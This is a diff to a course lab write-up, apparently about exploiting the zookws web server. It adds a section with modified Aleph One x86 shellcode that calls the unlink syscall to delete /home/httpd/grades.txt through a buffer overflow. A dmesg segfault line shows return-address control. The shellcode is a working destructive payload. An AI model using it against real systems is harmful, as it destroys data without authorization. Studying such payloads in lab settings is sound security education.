@@ -90,4 +90,47 @@ If we look at the status of dmesg, we can see the following:
     [ 9611.046876] zookfs-exstack[3471]: segfault at 42424242 ip 42424242 sp bfffde00 error 14
 
 ------
+
+## Unlinking grades.txt
+
+For the buffer overflow exploit we were required to modify the Aleph One's shellcode in a way that it will use the Linux syscall unlink that will remove the /home/httpd/grades.txt file from the machine. Below we have provided the modified shellcode.S file to achieve this goal:
+
+    #include <sys/syscall.h>
+
+    #define STRING	"/home/httpd/grades.txt" /* Provide the filepath to the grades.txt file */
+    #define STRLEN	22 /* Length of the string for the target file */
+    #define ARGV	(STRLEN+1)
+    #define ENVP	(ARGV+4)
+
+    .globl main
+    	.type	main, @function
+
+     main:
+    	jmp	calladdr
+
+     popladdr:
+    	popl	%esi
+    	movl	%esi,(ARGV)(%esi)	/* set up argv pointer to pathname */
+    	xorl	%eax,%eax		/* get a 32-bit zero value */
+    	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
+    	movl	%eax,(ENVP)(%esi)	/* set up null envp */
+
+    	movb	$SYS_unlink,%al		/* syscall arg 1: syscall for unlink */
+    	movl	%esi,%ebx		/* syscall arg 2: string pathname */
+    	leal	ARGV(%esi),%ecx		/* syscall arg 2: argv */
+    	leal	ENVP(%esi),%edx		/* syscall arg 3: envp */
+    	int	$0x80			/* invoke syscall */
+
+    	xorl	%ebx,%ebx		/* syscall arg 2: 0 */
+    	movl	%ebx,%eax
+    	inc	%eax			/* syscall arg 1: SYS_exit (1), uses */
+        					/* mov+inc to avoid null byte */
+    	int	$0x80			/* invoke syscall */
+
+     calladdr:
+    	call	popladdr
+    	.ascii	STRING
+
+------
+
 Word about stack canaries here 
